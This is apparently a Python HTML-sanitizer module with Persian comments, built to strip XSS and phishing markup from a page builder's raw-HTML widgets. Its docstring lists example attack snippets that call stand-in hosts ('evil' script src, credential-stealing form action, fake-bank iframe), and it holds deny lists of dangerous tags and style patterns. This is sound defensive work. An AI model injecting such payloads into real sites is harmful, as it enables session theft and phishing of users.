# -*- coding: utf-8 -*-
"""پاکسازی HTML دلخواه (ضد XSS / فیشینگ / Safe Browsing)

چرا این فایل لازم است؟
----------------------
در صفحه‌ساز چند جا HTML خام با فیلتر `|safe` رندر می‌شود (ویجت «HTML دلخواه»،
«ویرایشگر متن»، نقاط قوت/ضعف نظرات و ...). اگر حتی یک حساب مدیر/مدرس لو برود
— یا یک ورودی از مسیر دیگری به این فیلدها برسد — مهاجم می‌تواند:

  * `<script src="//evil/x.js">` تزریق کند (سرقت سشن، ریدایرکت خودکار)
  * `<iframe src="https://fake-bank...">` بگذارد (صفحهٔ فیشینگ بانکی داخل دامنه ما)
  * `<form action="https://evil">` بسازد و رمز/کارت کاربر را بیرون بفرستد
  * `<a href="javascript:...">` یا `onclick=` بگذارد

هر کدام از این‌ها دقیقاً همان الگویی است که Google Safe Browsing به‌عنوان
«Social Engineering / Deceptive site» علامت می‌زند و کروم کل دامنه را با پیام
«Dangerous site» مسدود می‌کند.

این ماژول یک sanitizer مبتنی بر «لیست سفید» است و به هیچ پکیج بیرونی نیاز ندارد
(روی هاست اشتراکی بدون امکان نصب bleach هم کار می‌کند).
"""
import re
from html import escape as _esc
from html.parser import HTMLParser

# ── تگ‌های مجاز (فقط محتوایی/چیدمانی — هیچ تگ اجرایی) ──
ALLOWED_TAGS = {
    'a', 'abbr', 'b', 'blockquote', 'br', 'caption', 'code', 'col', 'colgroup',
    'dd', 'div', 'dl', 'dt', 'em', 'figcaption', 'figure', 'h1', 'h2', 'h3',
    'h4', 'h5', 'h6', 'hr', 'i', 'img', 'li', 'mark', 'ol', 'p', 'pre', 's',
    'small', 'span', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'tfoot',
    'th', 'thead', 'tr', 'u', 'ul', 'video', 'source', 'picture', 'time',
}

# تگ‌هایی که خودبسته‌اند
VOID_TAGS = {'br', 'hr', 'img', 'col', 'source'}

# تگ‌هایی که محتوای داخلشان هم باید کاملاً دور ریخته شود (نه فقط خود تگ)
DROP_CONTENT_TAGS = {'script', 'style', 'iframe', 'object', 'embed', 'applet',
                     'form', 'button', 'select', 'option', 'textarea',
                     'svg', 'math', 'template', 'noscript',
                     'frame', 'frameset', 'audio'}

# تگ‌های ممنوعِ «خودبسته»: پایان‌تگ ندارند، پس نباید وارد پشتهٔ حذف شوند
# (وگرنه یک <input> تنها باعث می‌شد کل ادامهٔ سند دور ریخته شود).
DROP_VOID_TAGS = {'input', 'link', 'meta', 'base', 'param', 'track'}

# ── ویژگی‌های مجاز به‌ازای هر تگ ──
_GLOBAL_ATTRS = {'class', 'id', 'style', 'title', 'dir', 'lang', 'role'}
ALLOWED_ATTRS = {
    'a': _GLOBAL_ATTRS | {'href', 'target', 'rel', 'download'},
    'img': _GLOBAL_ATTRS | {'src', 'alt', 'width', 'height', 'loading', 'srcset', 'sizes'},
    'video': _GLOBAL_ATTRS | {'src', 'poster', 'controls', 'width', 'height',
                              'muted', 'loop', 'playsinline', 'preload'},
    'source': _GLOBAL_ATTRS | {'src', 'srcset', 'type', 'media'},
    'td': _GLOBAL_ATTRS | {'colspan', 'rowspan'},
    'th': _GLOBAL_ATTRS | {'colspan', 'rowspan', 'scope'},
    'col': _GLOBAL_ATTRS | {'span'},
    'colgroup': _GLOBAL_ATTRS | {'span'},
    'time': _GLOBAL_ATTRS | {'datetime'},
}

# پروتکل‌های مجاز در href/src
_SAFE_URL_RE = re.compile(
    r'^(?:https?:|mailto:|tel:|/|\./|\.\./|#|data:image/(?:png|jpe?g|gif|webp|avif);base64,)',
    re.I)

# الگوهای خطرناک داخل style (اجرای کد یا فراخوانی منبع بیرونی)
# url() فقط به منابع هم-دامنه (/...) یا data:image مجاز است. url() به دامنهٔ
# بیرونی هم نشت اطلاعات (IP/رفرر بازدیدکننده به سرور مهاجم) است و هم راهی برای
# بارگذاری محتوای کنترل‌شده توسط مهاجم داخل صفحهٔ ما.
_BAD_STYLE_RE = re.compile(
    r'(expression\s*\(|javascript\s*:|vbscript\s*:|behavior\s*:|@import'
    r'|url\s*\(\s*["\']?\s*(?!data:image/|/))',
    re.I)


def _clean_url(value):
    """URL امن یا None — javascript:/vbscript:/data:text-html همه رد می‌شوند"""
    v = (value or '').strip()
    if not v:
        return None
    # حذف کاراکترهای کنترلی/فاصله‌های مخفی که برای دور زدن فیلتر استفاده می‌شوند
    v = re.sub(r'[\x00-\x20\x7f]+', '', v)
    if not _SAFE_URL_RE.match(v):
        return None
    return v


def _clean_style(value):
    v = (value or '').strip()
    if not v or _BAD_STYLE_RE.search(v):
        return None
    return v


class _Sanitizer(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.out = []
        self._drop_depth = 0      # داخل تگی هستیم که محتوایش هم دور ریخته می‌شود؟
        self._open = []           # پشتهٔ تگ‌های بازِ مجاز

    # ---- کمک‌کننده‌ها ----
    def _attrs_for(self, tag, attrs):
        allowed = ALLOWED_ATTRS.get(tag, _GLOBAL_ATTRS)
        parts = []
        is_ext_link = False
        for name, value in attrs:
            name = (name or '').lower()
            # هیچ ویژگی رویداد (onclick, onerror, onload, ...) هرگز مجاز نیست
            if name.startswith('on') or name not in allowed:
                continue
            if value is None:
                parts.append(name)
                continue
            if name in ('href', 'src', 'poster'):
                value = _clean_url(value)
                if value is None:
                    continue
                if name == 'href' and re.match(r'^https?:', value, re.I):
                    is_ext_link = True
            elif name == 'srcset':
                # هر آیتم srcset باید URL امن باشد
                items = []
                for part in str(value).split(','):
                    u = part.strip().split(' ')[0]
                    if _clean_url(u):
                        items.append(part.strip())
                if not items:
                    continue
                value = ', '.join(items)
            elif name == 'style':
                value = _clean_style(value)
                if value is None:
                    continue
            elif name == 'target':
                value = '_blank' if str(value).strip().lower() == '_blank' else '_self'
            parts.append('%s="%s"' % (name, _esc(str(value), quote=True)))
        # لینک خارجی که در تب جدید باز می‌شود بدون rel امن = آسیب‌پذیری tabnabbing
        if tag == 'a' and is_ext_link:
            parts = [p for p in parts if not p.startswith('rel=')]
            parts.append('rel="noopener noreferrer nofollow ugc"')
        return parts

    # ---- کال‌بک‌های HTMLParser ----
    def handle_starttag(self, tag, attrs):
        tag = (tag or '').lower()
        if tag in DROP_VOID_TAGS:
            return  # فقط خود تگ حذف می‌شود، نه بقیهٔ سند
        if tag in DROP_CONTENT_TAGS:
            self._drop_depth += 1
            return
        if self._drop_depth or tag not in ALLOWED_TAGS:
            return
        parts = self._attrs_for(tag, attrs)
        if tag in VOID_TAGS:
            self.out.append('<%s%s>' % (tag, (' ' + ' '.join(parts)) if parts else ''))
        else:
            self._open.append(tag)
            self.out.append('<%s%s>' % (tag, (' ' + ' '.join(parts)) if parts else ''))

    def handle_startendtag(self, tag, attrs):
        tag = (tag or '').lower()
        if (self._drop_depth or tag in DROP_CONTENT_TAGS or
                tag in DROP_VOID_TAGS or tag not in ALLOWED_TAGS):
            return
        parts = self._attrs_for(tag, attrs)
        self.out.append('<%s%s>' % (tag, (' ' + ' '.join(parts)) if parts else ''))

    def handle_endtag(self, tag):
        tag = (tag or '').lower()
        if tag in DROP_VOID_TAGS:
            return
        if tag in DROP_CONTENT_TAGS:
            if self._drop_depth:
                self._drop_depth -= 1
            return
        if self._drop_depth or tag not in ALLOWED_TAGS or tag in VOID_TAGS:
            return
        if tag in self._open:
            # بستن تگ‌های تودرتوی بازمانده تا ساختار خراب نشود
            while self._open:
                t = self._open.pop()
                self.out.append('</%s>' % t)
                if t == tag:
                    break

    def handle_data(self, data):
        if self._drop_depth:
            return
        self.out.append(_esc(data, quote=False))

    def handle_comment(self, data):
        # کامنت‌ها حذف می‌شوند (conditional comments در IE قابل سوءاستفاده بودند)
        return

    def handle_decl(self, decl):
        return

    def unknown_decl(self, data):
        return

    def handle_pi(self, data):
        return

    def result(self):
        while self._open:
            self.out.append('</%s>' % self._open.pop())
        return ''.join(self.out)


def sanitize_html(value):
    """HTML امن‌شده (رشتهٔ ساده) — ورودی None/غیررشته → رشتهٔ خالی"""
    if value is None:
        return ''
    if not isinstance(value, str):
        value = str(value)
    if not value.strip():
        return ''
    p = _Sanitizer()
    try:
        p.feed(value)
        p.close()
    except Exception:
        # در بدترین حالت، متن را کاملاً escape کن (هرگز خام برنگردان)
        return _esc(value, quote=False)
    return p.result()


def sanitize_markup(value):
    """مثل sanitize_html ولی خروجی Markup (برای رندر مستقیم در Jinja)"""
    from markupsafe import Markup
    return Markup(sanitize_html(value))


def escape_nl2br(value):
    """متن ساده → HTML امن با تبدیل خط جدید به <br> (بدون اجازهٔ هیچ تگی)"""
    from markupsafe import Markup
    return Markup(_esc(value or '', quote=False).replace('\n', '<br>'))
